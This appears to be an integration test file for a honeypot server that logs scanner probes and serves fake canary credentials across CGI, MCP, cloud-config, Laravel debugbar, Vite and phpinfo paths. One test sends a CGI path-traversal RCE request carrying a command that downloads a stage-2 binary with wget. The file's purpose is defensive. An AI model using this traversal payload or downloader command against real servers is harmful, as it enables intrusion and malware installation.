    404 here would tell the scanner "patched" and it would never send
    the POST that carries the command."""
    base, log_path = live_server
    target = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    async with aiohttp.ClientSession() as session:
        async with session.get(
            URL(f"{base}{target}", encoded=True),
            headers={"X-Forwarded-For": "203.0.113.41"},
        ) as resp:
            assert resp.status == 500
            body = await resp.read()
            assert b"Internal Server Error" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    rows = [e for e in entries if e.get("result") == "cgi-traversal-rce-probe"]
    assert rows, "no probe row logged"
    # `path` has been normalised to /bin/sh — the CVE shape only survives
    # in the raw-target field, which is the whole reason it is logged.
    assert rows[-1]["cgiTraversalRawTarget"] == target
    assert rows[-1]["cgiTraversalHasCommand"] is False


async def test_integration_cgi_traversal_rce_captures_command_and_urls(live_server):
    """The POST carrying the mod_cgi preamble is the payload-bearing
    request: the command, its stage-2 URL and the downloader it reaches
    for all land in structured fields, and the response is plausible
    command output so a second command follows."""
    base, log_path = live_server
    target = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    async with aiohttp.ClientSession() as session:
        async with session.post(
            URL(f"{base}{target}", encoded=True),
            headers={"X-Forwarded-For": "203.0.113.42"},
            data=b"echo Content-Type: text/plain; echo; wget http://198.51.100.9/x86 -O /tmp/x; id",
        ) as resp:
            assert resp.status == 200
            body = await resp.read()

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    rows = [e for e in entries if e.get("result") == "cgi-traversal-rce-command"]
    assert rows, "no command row logged"
    row = rows[-1]
    assert row["cgiTraversalHasCommand"] is True
    assert row["cgiTraversalCommand"].startswith("wget http://198.51.100.9/x86")
    assert "http://198.51.100.9/x86" in row["cgiTraversalPayloadUrls"]
    assert "wget" in row["cgiTraversalDownloaders"]
    assert row["cgiTraversalRawTarget"] == target


async def test_integration_mcp_get_with_sse_accept_opens_stream(live_server):
    """Streamable HTTP serves the server-to-client stream from a GET on
    the JSON-RPC endpoint. 405 there ends the walk before the POST that
    carries `tools/call`."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/mcp",
            headers={"X-Forwarded-For": "203.0.113.43", "Accept": "text/event-stream"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/event-stream")
            assert b"event: endpoint" in await resp.read()

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("result") == "mcp-server-stream-handshake" for e in entries)


async def test_integration_mcp_get_without_sse_accept_still_405s(live_server):
    """A plain GET is not a transport handshake — a real server rejects it,
    and matching that keeps the surface honest."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/mcp", headers={"X-Forwarded-For": "203.0.113.44"},
        ) as resp:
            assert resp.status == 405

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("result") == "mcp-server-method-not-allowed" for e in entries)


async def test_integration_api_mcp_alias_dispatches(live_server):
    """Gateway-mounted alias reaches the same JSON-RPC handler."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.post(
            f"{base}/api/mcp",
            headers={"X-Forwarded-For": "203.0.113.45"},
            json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
        ) as resp:
            assert resp.status == 200
            payload = await resp.json()
            assert payload.get("jsonrpc") == "2.0"


async def test_integration_aws_exports_js_serves_canary(live_server):
    """Amplify's generated bundle artifact carries the canary triple in the
    fields a grep-based harvester filters on."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/aws-exports.js", headers={"X-Forwarded-For": "203.0.113.46"},
        ) as resp:
            assert resp.status == 200
            body = await resp.read()
            assert b"AKIAFAKEINTEG01" in body
            assert b"const awsmobile" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("result") == "aws-amplify-exports-js" for e in entries)


async def test_integration_serverless_yml_serves_canary(live_server):
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/serverless.yml", headers={"X-Forwarded-For": "203.0.113.47"},
        ) as resp:
            assert resp.status == 200
            body = await resp.read()
            assert b"AKIAFAKEINTEG01" in body
            assert b"provider:" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("result") == "serverless-config" for e in entries)


async def test_integration_service_account_key_names_serve_canary(live_server):
    """The bare-filename service-account dictionary a credential harvester
    walks when it cannot know the project's naming convention."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        for path in ["/key.json", "/serviceAccountKey.json", "/amplifyconfiguration.json"]:
            async with session.get(
                f"{base}{path}", headers={"X-Forwarded-For": "203.0.113.48"},
            ) as resp:
                assert resp.status == 200, path
                assert b"AKIAFAKEINTEG01" in await resp.read(), path


async def test_integration_vite_fs_resolves_new_cloud_artifacts(live_server):
    """The `/@fs/` resolver walks the same exact-path trap table, so every
    path added to the dictionary closes on the arbitrary-read surface too
    — the surface a dev-server file-read sweep actually uses."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/@fs/app/aws-exports.js?raw??",
            headers={"X-Forwarded-For": "203.0.113.49"},
        ) as resp:
            assert resp.status == 200
            assert b"AKIAFAKEINTEG01" in await resp.read()

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(
        e.get("result") == "vite-fs-aws-amplify-exports-js" for e in entries
    ), [e.get("result") for e in entries]


async def test_integration_debugbar_two_step_chain(live_server):
    """Listing then payload, over a real socket. The listing must be
    harvest-worthless and the payload must carry the canary — that split
    is what makes the second request meaningful."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/_debugbar/open", headers={"X-Forwarded-For": "203.0.113.60"},
        ) as resp:
            assert resp.status == 200
            listing = json.loads(await resp.text())
    assert b"AKIAFAKEINTEG01" not in json.dumps(listing).encode()

    stored_id = listing[1]["id"]
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/_debugbar/open?op=get&id={stored_id}",
            headers={"X-Forwarded-For": "203.0.113.60"},
        ) as resp:
            assert resp.status == 200
            payload = await resp.read()
    assert b"AKIAFAKEINTEG01" in payload

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    got = [e for e in entries if str(e.get("result", "")).startswith("laravel-debugbar")]
    assert [e["result"] for e in got] == [
        "laravel-debugbar-open-list", "laravel-debugbar-open-get",
    ], [e.get("result") for e in got]
    # The discriminator: this client read our listing.
    assert got[1]["debugbarIdKnown"] is True
    assert got[1]["debugbarStoredId"] == stored_id


async def test_integration_debugbar_guessed_id_is_flagged(live_server):
    """A client that never read the listing still gets a payload, but the
    log says it guessed."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/_debugbar/open?op=get&id=Xnotours",
            headers={"X-Forwarded-For": "203.0.113.61"},
        ) as resp:
            assert resp.status == 200
            assert b"AKIAFAKEINTEG01" in await resp.read()

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    got = next(e for e in entries if e.get("result") == "laravel-debugbar-open-get")
    assert got["debugbarIdKnown"] is False
    assert got["debugbarStoredId"] == "Xnotours"


async def test_integration_debugbar_disabled_switch_404s(live_server, monkeypatch):
    base, log_path = live_server
    monkeypatch.setattr(tbenv, "LARAVEL_DEBUGBAR_ENABLED", False)
    async with aiohttp.ClientSession() as session:
        for path in ("/_debugbar/open", "/_debugbar", "/_debugbar/open?op=get&id=X1"):
            async with session.get(
                f"{base}{path}", headers={"X-Forwarded-For": "203.0.113.62"},
            ) as resp:
                assert resp.status == 404, path


async def test_integration_phpinfo_nested_under_unknown_parent(live_server):
    """The leaf resolver reaches the real phpinfo renderer and its canary,
    not just a matcher."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        for path in ("/wp-admin/phpinfo.php", "/cgi-bin/info.cgi",
                     "/crm/backend/phpinfo.php"):
            async with session.get(
                f"{base}{path}", headers={"X-Forwarded-For": "203.0.113.63"},
            ) as resp:
                assert resp.status == 200, path
                assert b"AKIAFAKEINTEG01" in await resp.read(), path

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    got = [e for e in entries if e.get("result") == "phpinfo"]
    assert len(got) == 3, [e.get("result") for e in entries]
    # `trapWalkDepth` is the "arrived nested" signal and must be stamped.
    assert [e.get("trapWalkDepth") for e in got] == [1, 1, 2]
